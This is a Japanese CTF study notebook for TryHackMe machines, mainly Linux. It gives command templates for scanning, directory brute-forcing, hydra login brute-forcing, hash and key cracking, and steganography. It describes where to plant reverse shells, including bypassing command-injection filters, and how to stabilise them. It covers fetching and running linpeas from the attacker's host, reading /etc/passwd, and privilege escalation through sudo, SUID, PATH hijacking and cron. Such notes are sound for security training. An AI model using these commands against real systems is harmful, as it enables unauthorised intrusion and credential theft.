# TryHackMeマシン攻略メモ

## 趣旨
脆弱性そのものを見つけたりexploitを作ることよりも、マシン攻略のヒントを得るためのメモ。ほぼLinuxマシンを対象に書いている。

## 書いた人
[cashitsuki](https://tryhackme.com/p/cashitsuki)。セキュリティとTryHackMeの初心者。基本Esayばかり解いている。


## よく見るところ
- [HackTricks](https://book.hacktricks.xyz/welcome/readme) ... exploitや脆弱性のヒントが得られる
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) ... 同上。リバースシェルと権限昇格のページはよく見る
- [EXPLOIT DATABASE](https://www.exploit-db.com/) ... 見慣れないソフトウェアが動いていたらここを確認してexploitを手に入れる
- [CyberChef](https://gchq.github.io/CyberChef/) ... エンコード/デコードがブラウザ上でチェーンしてできる
- [Kali Tools](https://www.kali.org/tools/) ... キーワード検索でコマンドやバイナリの候補が見られる
- コンソール上で`curl cheat.sh/$COMMAND`を叩く

## 解いている間のメモ
ヒントは見つけた順番で書くと自分は混乱しやすかった。そのため、ポート番号やディレクトリごとに分類して整理している。

## nmap

テンプレはこれ。

```
sudo nmap -vv -sV -sC -T4 -oN nmap/log $MACHINE_IP
```

- `-vv`  ... 結果を詳細に出力する
- `-sV`  ... 該当するポートで稼働するサービスやバージョンを見つける
- `-sC`  ... スクリプトを起動する
- `-oN`  ... 結果をファイルに書き込む
- `-T4`  ... パケット送信のタイミングを指定する
- `-Pn`  ... ICMPを使ったパケット通信をしない(Windowsはデフォルトで`ping`に応答しないのでこのオプションが必要なときがある)

writeupを見ていると[RustScan](https://github.com/RustScan/RustScan)でポートスキャンしてるものもたまに見かける。

## gobuster
最初は何の言語で動いているかわからないので`-x`は省いてることが多い。

```
gobuster dir -u http://$MACHINE_IP -w /path/to/wordlist -o gobuster/log -x .php,.js
```

- -u ... URLを指定する
- -w ... ワードリストを指定
- -o ... 結果をファイルに書き込む
- -x ... ファイルの拡張子を指定
- -b ... 指定したステータスコードは出力しない(たまに使う)

ディレクトリ探索で[ffuf](https://github.com/ffuf/ffuf)使っている人もたまに見る。

### ワードリスト
[SecLists](https://github.com/danielmiessler/SecLists)内のものを使う。

基本的には以下の2つで十分。
- `/Discovery/Web-Content/combined_directories.txt`(ファイルとディレクトリ探索用)
- `/Discovery/Web-Content/combined_words.txt`(ファイル探索用)

さくっと探索したいなら以下の2つでもOKなことが多い。

- `/Discovery/Web-Content/common.txt`
- `/Discovery/Web-Content/directory-list-2.3-medium.txt`

`common.txt`以外100%探索にはかなりの時間が掛かる。そのためだいたい2割か3割で処理を打ち切っている。 


## FTP
```
ftp $MACHINE_IP
```
- `-P` ... オプションでポート番号の指定ができる


nmapで`-sC`オプションを指定しておけばポートスキャン時にanonymousログインが許されるかのどうかが判定できる。許可されていればユーザー名は`anonymous`、パスワードは空欄でログインできる。

ftpでよく使うコマンドは以下。
- `help`  ... ヘルプの表示
- `get`   ... ファイルのダウンロード
- `put`   ... ファイルのアップロード
- `pwd`   ... カレントディレクトリの表示
- `chmod` ... ファイルの権限を編集
- `user`  ... ユーザー名の入力
- `exit`  ... 終了 

ファイルの取得なら`wget`でもできる。

```
wget -r ftp://user:pass@$MACHINE_IP/
```


## SMB
以下使ったことがある。SMBの問題を解いた数が少なすぎるので自分の中でテンプレができていない。
- `enum4linux`
- [A Little Guide to SMB Enumeration](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)
- [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#list-shared-folders)


## Webページからヒントを見つけるために
- `gobuster`とかでディレクトリ探索をする
- バージョンを確認する
    - [Wappalyzer](https://www.wappalyzer.com/)を使う。ChromeとFirefox両方で拡張がある
    - ソフトウェアの名前とバージョン番号で[EXPLOIT DATABASE](https://www.exploit-db.com/)を検索するとexploitが見つかってそのままMetasploit一つで解決することもよくある
        - RCE(Remote Code Execution)やAFU(Arbitrary File Upload)、Backdoorを優先的に探す
- ログインページを見つける
- Firefoxで右クリック->View Page Sourceでソースコードを確認できる
    - コメントにユーザー名や隠しページへのパス、フラグが書かれていることがよくある
    - hidden属性がある要素にヒントが書かれていることがある
- [TryHackMeのBurp Suiteのページ](https://tryhackme.com/module/learn-burp-suite)で使い方を知る
    - よく使うのはInterceptorとRepeator
    - FoxyProxyを入れておくと切り替え操作が楽になる
- 開発者ツールでネットワークを確認する
    - ChromeとFirefox両方共、開発者ツールにNetworkタブがある
    - CookieやUser-Agent、クエリパラメーターに注目する
- JavaScriptをoffにする
    - FirefoxでURLに`about:config`と入力することでブラウザの設定画面に移る。`javascript.enabled`と入力して`false`とすればJavaScriptをoffにできる
    - Chromeはsettings->Privacy and security->Content->JavaScriptから-> Don't allow sites to use JavaScriptにチェックを入れる 


## 攻略途中で得られたファイルについて

### 実行可能なバイナリファイル
- `file`コマンドでアーキテクチャを調べる
- `Gidra`でデコンパイラを行う
- `strace`や`ltrace`でシステムコールやライブラリを調べる
- `objdump`を使った静的解析、`gdb`を使った動的解析をする

### ハッシュ

`hash-identifier`をコンソール上で叩いてハッシュの種類を特定した後、`hashacat`で総当りする。

```
# ヘルプからMD5のモード値(=70)を調べる
hashcat -h | grep 'MD5'
hashcat -a 0 -m 70 ./pass.hash /path/to/wordlsit
```
[Generic hash types](https://hashcat.net/wiki/doku.php?id=example_hashes)
- `-a` ... 攻撃モード
- `-m` ... ハッシュの種類

以下のサイトを使ってハッシュ元を得ることも多い。
- [CrackStation](https://crackstation.net/)
- [MD5Hashing.net](https://md5hashing.net)
- [hashes.com](https://hashes.com/en/decrypt/hash)

使うワードリストは`rockyou.txt`が多い。

### zipファイル
`unzip`しようとしたらパスフレーズを求められることがある。
```
zip2john ./zipfile > zipfile.hash
john --wordlist=/path/to/wordlists ./zipfile.hash 
```

### SSH鍵
プライベート鍵を手に入れてログインしようとしたらパスフレーズを求められることがある。
```
ssh2john ./privkey > privkey.hash
john --wordlist=/path/to/wordlists ./privkey.hash 
```

### 画像
攻略途中で得られた情報が画像の場合、データが埋め込まれている可能性がある。
```
# exiftool
# データが埋め込まれているかどうかを確認
exiftool ./image-file

# strings
# 埋め込まれたデータを直接見る
stirngs ./image-file

# binwalk
# 埋め込まれたデータを取り出す
binwalk -v -e ./image-file

# steghide
# 埋め込まれたデータを取り出す
steghide extract -v -p $PASSWORD -sf ./image-file

# stegcracker
# steghideでパスフレーズが求められる場合総当りする
stegcracker -V ./image-file /path/to/wordlist
```

画像がうまく開けない場合マジックナンバーが不正なことが多い。バイナリエディタで直接編集する。

[File Magic Numbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)

```
# hexeditor
hexeditor ./image-file
```
- 矢印キーで上下左右に移動
- F2で保存
- F3でファイルを開く
- Ctrl-Xで保存して閉じる


## hydra
- `-l` ... ログインユーザーを指定する
- `-L` ... ファイル指定をすると複数ユーザーで試行する
- `-p` ... パスワードを指定する
- `-P` ... ファイル指定をすると複数パスワードで試行する
- `-s` ... ポート番号を指定する
- `-v` ... 結果を詳細に出力する
- `-S` ... SSLを使う
- `-o` ... 結果をファイルに書き込む
- `-w` ... 試行までの待ち時間


以下に例。
```
# SSH
hydra -l admin -P /path/to/wordlist $MACHINE_IP ssh

# FTP
hydra -l admin -P /path/to/wordlist $MACHINE_IP ftp

# HTTP(POST)
hydra -l admin -P /path/to/wordlist $MACHINE_IP http-get-form '/hidden/login/:username=^USER^&password=^PASS^:$FAILED_MESSAGE'
```
HTTPやHTPPSでリクエストを送るとき、最後の部分は`IP以外のURL:body部分:失敗時のメッセージ`のフォーマットになる。ここで`^USER^`と`^PASS^`と書けばそこにログインユーザーとパスワードをそれぞれ当てはめて試行される。また、`$FAILED_MESSAGE`にはログイン失敗時に表示されるメッセージを書く。ここの書き方を間違えるとすべてのパターンでログインが成功扱いになってしまう。


## リバースシェル
- 基本事項は[TryHackMeのこのroom](https://tryhackme.com/room/introtoshells)で学べる
- リバースシェル本体を手に入れるときは[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)を使う

リバースシェルを仕掛ける場所は問題を解いて勘を養うしかないと思っている。よくあるのは以下。
- FTPでファイルをアップロード後、`assets`や`upload`といったディレクトリにアクセスして呼び出す
    - FTP側で`chmod`使って実行できるようにしておく
- OSコマンドインジェクションで仕掛ける。
    - ブラックリスト化でフィルタリングされていることが多いのでコマンド名に改行を挟んだりして迂回する
- cornで指定されているジョブの対象になっているファイルを書き換える/置き換える
- WordPressといったCMSのテンプレートを編集する。404ページやヘッダー部分にリバースシェルを仕込んで該当ページにアクセスする
- Metasploitを使う


## 攻略対象のマシンに入ったら
最初にやることは以下。
- `whoami` ... ユーザー名を確認する
- `id` ... ユーザーのグループを確認する
    - 自分以外のグループに所属しているかを確認することが重要
- `cat /etc/passwd`でユーザーのー覧を確認する
- リバースシェルだと画面が安定しないので以下を実行する
    1. `export TERM=xterm`
    2. `python3 -c "import pty;pty.spawn('/bin/bash');"`
    3. Ctrl-Zを押す
    4. `stty raw -echo; fg`

### ファイルの受け渡し
`wget`か`scp`を使う。
`wget`の場合
```
# 待ち受け側
python3 -m http.server 3000
```

```
# 取得側
wget http://$LOCAL_MACHINE_IP:$LPORT/file/to/get
```

`scp`の例
```
# リモートからローカルへコピー
scp usr@$MACHINE_IP:/home/usr/secret.txt ./

# ローカルからリモートへコピー
scp ./exploit user@$MACHINE_IP:/home/user/ 
```
- `-r` ... ディレクトリを再帰的にコピー
- `-C` ... 圧縮して通信
- `-P` ... ポート番号を指定　
- `-i` ... 鍵ファイルを指定


### LinPEASとwinPEAS
攻略対象のマシンに入って何をすべきかわからないうちは[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)や[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)を使うのがいい。

```
# ローカルマシン上
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220918/linpeas.sh
python3 -m http.server 3000
```

```
# リモートマシン上
cd /tmp
wget http://$LOCAL_IP:3000/linpeas.sh
./linpes.sh | tee linpeas.log
```
自分がいるディレクトリで書き込みが許されていないというパターンがあるので`/tmp`に移動しておく。

Windowsなら以下のようにする。

```
# ローカルマシン上
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220918/winPEASx64.exe
python3 -m http.server 3000
``` 

```
# リモートマシン上
cd C:\Windows\Temp
Invoke-WebRequest -Uri http://$LOCAL_IP:3000/winPEASx64.exe -OutFile winPEASx64.exe
.\winPEASx64.exe
```


### ポートフォワード
`netstat -lvnp`でサーバーが待ち受けているポート番号一覧が取得できる。結果を見ると、たまにポートスキャナで検知できなかったものがある。このとき普通にローカルマシンからアクセスしようとしても弾かれてしまうのでポートフォワーディングを実行してアクセスできるようにする。

```
# REMOTE_MACHINE_IPの8080ポートをlocalhostの3000番にポートフォワードする場合
ssh -i keyfile -L 8080:localhost:3000 -N -f user@$REMOTE_MACHINE_IP
```
[Tunneling and Port Forwarding](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding?q=port+foward)

- `-i` ... 鍵ファイルの指定
- `-L` ... ポートフォワードを行う
- `-N` ... リモートコマンドを実行しない
- `-f` ... コマンドを実行する前に`ssh`をバックグラウンドにする

### 権限昇格
だいたい[Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)に書いてある。

よく使うのは以下。

- `sudo -l`を使って`sudo`で実行できるものを使う
    - 見つかったら[GTFOBins](https://gtfobins.github.io/)で確認
    - `-l`オプションの表示が分かりづらければ`-ll`オプションを使う
    - まれにrootで実行するのを禁止しているものがあるが`-u`オプションをつければ他ユーザーで実行できる
    - リバースシェル起動時だとパスワードが分からないのでこの手段は使えないことが多い
- SUIDビットが立ったバイナリを見つけて実行する
    - 見つかったら[GTFOBins](https://gtfobins.github.io/)で確認
    - リバースシェルを起動する同名のファイルを別の場所に用意、その後環境変数を上書きして実行させるという方法がある
- `cron`のジョブのうち、自分以外のユーザーで実行をされているものを書き換える
    - 大抵ジョブのファイルが読み書き可能なのでそこにリバースシェルを仕込んで別ユーザーやrootでシェルを獲得できる
    - ジョブで実行されるファイルがバイナリの場合はリバースシェルを起動する同名のファイルを作って差し替える
- SSHの秘密鍵が残っているのでそれを利用して別ユーザーでログインする
- `id`コマンドで自分が別グループに所属している場合、そのグループがアクセスまたは実行できるファイルを探す。
- Webページが主題のroomならソースをチェックする。`/var/www`以下にパスワードなどのヒントが落ちていることが多い
    - CMSなら設定ファイルを確認する。wordpressなら`wp-config.php`